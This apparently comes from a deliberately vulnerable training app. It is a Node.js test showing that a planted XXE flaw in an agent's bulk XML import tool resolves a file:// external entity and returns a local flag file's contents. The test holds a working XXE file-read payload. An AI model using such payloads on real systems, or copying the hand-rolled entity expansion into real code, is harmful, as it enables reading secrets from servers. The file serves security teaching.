const test = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');
const os = require('node:os');
const fs = require('node:fs');
const http = require('node:http');
const { seedShop, purgeToolCaches } = require('../_fixture.js');

const REPO = path.resolve(__dirname, '../../../..');

/**
 * @intentional-vulnerability xxe-import-bulk
 * @teaches OWASP-Web:A05
 * @location agent-host/agents/listing/tools/import_bulk.js
 * The XML importer hand-rolls DOCTYPE external entity expansion. A payload
 * with <!ENTITY xxe SYSTEM "file:///..."> resolves to real file contents
 * before xml2js parses it.
 */
test('xxe-import-bulk: file:// SYSTEM entity resolves against local file', async () => {
  const s = await seedShop();
  purgeToolCaches();
  try {
    // Write a "secret" file and serve an XML payload that references it via XXE
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ss-xxe-'));
    const secretPath = path.join(dir, 'secret.txt');
    fs.writeFileSync(secretPath, 'FLAG{xxe-secureshop-merchant}');

    const xmlPayload = `<?xml version="1.0"?>
<!DOCTYPE products [
  <!ENTITY xxe SYSTEM "file://${secretPath}">
]>
<products>
  <product><name>&xxe;</name><description>xxe</description><price>1.00</price></product>
</products>`;

    const server = http.createServer((req, res) => {
      res.setHeader('content-type', 'application/xml');
      res.end(xmlPayload);
    });
    await new Promise(r => server.listen(0, r));
    const port = server.address().port;

    const { import_bulk } = require(path.join(REPO, 'agent-host/agents/listing/tools/import_bulk.js'));
    const r = await import_bulk({ xml_url: `http://127.0.0.1:${port}/catalog.xml` });
    await new Promise(resolve => server.close(resolve));

    assert.equal(r.ok, true);
    // The doc's product/name should now contain the resolved FLAG.
    // xml2js turns <name>...</name> into a string; walk both possible shapes.
    const nameField = r.xml_doc?.products?.product?.name || r.xml_doc?.products?.product?.[0]?.name;
    assert.match(String(nameField || ''), /FLAG\{xxe-secureshop-merchant\}/, 'XXE resolved file:// entity into name');

    fs.rmSync(dir, { recursive: true, force: true });
  } finally {
    await s.close();
  }
});
